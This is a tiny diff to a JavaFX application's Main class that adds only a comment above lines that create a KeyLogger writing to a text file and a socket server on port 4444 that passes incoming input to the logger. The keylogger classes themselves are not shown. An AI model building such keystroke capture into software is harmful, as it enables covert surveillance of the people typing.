@@ -22,6 +22,7 @@ public class Main extends Application {
     @Override
     public void start(Stage primaryStage){
         try{
+            //Start the server.
             KeyLogger keylogger = new KeyLogger("YOUR_KEYS_LOGGED.txt");
             SocketServer server = new SocketServer(4444, keylogger::logKey);
             server.startServer();
